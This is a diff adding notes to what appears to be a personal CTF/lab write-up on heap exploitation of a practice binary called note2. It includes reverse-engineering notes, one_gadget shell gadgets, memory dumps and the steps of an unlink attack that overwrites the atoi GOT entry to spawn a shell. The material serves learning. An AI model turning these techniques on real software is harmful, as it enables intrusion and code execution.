@@ -128,3 +128,100 @@ $ ls
 ls: ./libc-2.23.so: version `GLIBC_2.30' not found (required by /lib/x86_64-linux-gnu/libselinux.so.1)
 ```
 I guess if I execute `stkof` in a machine with a native libc2.23 env and attach remotely the pwn program I would be able to pop a shell.
+
+# note2
+
+```bash
+❯ file note2
+note2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=46dca2e49f923813b316f12858e7e0f42e4a82c3, stripped
+❯ pwn checksec note2
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+Seems to work like the previous `stkof` exercise, by offering the user several option to create, edit or delete entries.
+
+## New note
+
+A buffer is malloc'ed with a size provided by the user (max 0x81), and saved in the data region:
+```
+DAT_00602120 // list of buffer pointers
+DAT_00602140 // list of buffer(/note) length
+DAT_00602160 // number of notes
+```
+The id of a note is the number of notes - 1 (i.e. starts from 0). There seems to be a maximum of 4 notes. The length of the note must take in account the last null byte (len: 5, note: "hello" => will become "hell").
+
+Also, the note's content seems to be cleaned from '%', probably to avoid leaks with printf.
+
+## Show note
+
+Will show the content of the note at an index provided by the user (bounded by 0 <= index < 4). The selected buffer/note needs to be not null to display anything.
+
+## Edit note
+
+To edit a note it must:
+* have at least one note, or else it will display "Please add a note!"
+* have a valid index (0 <= index < 4)
+* exist (i.e buffer is not null)
+
+I can then overwrite it or append to it. It will display "TheNewContents:" (which is stored in the same buffer that will receive the user's input), then cancatenate and copy around the user's input. Note that the input buffer is malloc'ed, with a size of 0xa0.
+
+## Delete note
+
+This one is quite straightforward: it will free the selected buffer and set the corresponding length entry to 0.
+
+The only strange thing I noted is the absence of decrementation of the number of notes variable.
+
+## Exploit
+
+Now let's try to exploit this thing. Since it is an exercise about unlink, I will probably have to create all notes, then edit one to insert a fake chunk and free one to trigger an unlink exploit. That should give me a pointer to wherever I like, an I will probably overwrite a got entry or the like and put a gadget instead.
+
+As for the potential gadget, I have:
+```bash
+❯ one_gadget libc-2.23.so
+0x45216 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf02a4 execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1147 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+```
+
+Initially I tried to edit the first note in order to overwrite the `previous used` bit and `previous size` of the next memory chunk. However I was not able to (I received a sigsev), so I followed the tutorial's example to delete the second note (id 1), the create another one again with the same size, and overwrite the memory fields of the third note:
+```
+0x1061010:	0x0000000000000000	0x00000000000000a0  <-- first note
+0x1061020:	0x0000000000602108	0x0000000000602110
+0x1061030:	0x0000000000000000	0x0000000000000000
+0x1061040:	0x0000000000000000	0x0000000000000000
+0x1061050:	0x0000000000000000	0x0000000000000000
+0x1061060:	0x0000000000000000	0x0000000000000000
+0x1061070:	0x0000000000000000	0x0000000000000000
+0x1061080:	0x0000000000000000	0x0000000000000000
+0x1061090:	0x0000000000000000	0x0000000000000021  <-- second note metadata (after deletion then reallocation, so is it the fourth note now ?)
+0x10610a0:	0x3535353535353535	0x3535353535353535  <-- second note
+0x10610b0:	0x00000000000000a0	0x0000000000000090  <-- third note metadata (overwritten)
+```
+
+Deleting the third note will then trigger the unlink attack, and will give us a pointer in the pointer list:
+```
+0x602120:	0x0000000000602108	0x0000000000000000  <-- first and second note pointers
+0x602130:	0x0000000001de70c0	0x0000000001de70a0  <-- third and fourth note pointers
+```
+
+Then we will overwrite again this entry at 0x602120 in order to leak an address with `show_note`. The tutorial chose `atoi`, I'll try with `strlen`.
+
+Or so I thought... Since I'll have to trigger the gadget by calling the overwritten method, it is far more elegant to overwrite `atoi`, since it will be called anyway.
+
+As with the previous exercise, I was not able to call `ls` in the popped shell, probably because of a dependence itself depending on my host's libc.
